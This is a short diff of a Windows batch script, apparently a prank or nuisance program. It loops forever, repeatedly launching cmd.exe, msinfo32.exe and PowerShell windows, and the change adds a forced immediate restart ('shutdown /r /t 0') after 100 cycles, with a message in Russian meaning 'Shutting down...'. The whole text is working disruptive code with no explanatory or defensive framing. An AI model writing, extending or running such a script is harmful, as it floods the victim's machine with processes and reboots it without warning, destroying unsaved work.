@@ -11,4 +11,8 @@ start cmd.exe
 start msinfo32.exe
 start powershell.exe
 set /a "cycles+=1"
+if %cycles% == 100 (
+    echo Выключение...
+    shutdown /r /t 0
+)
 goto :forever
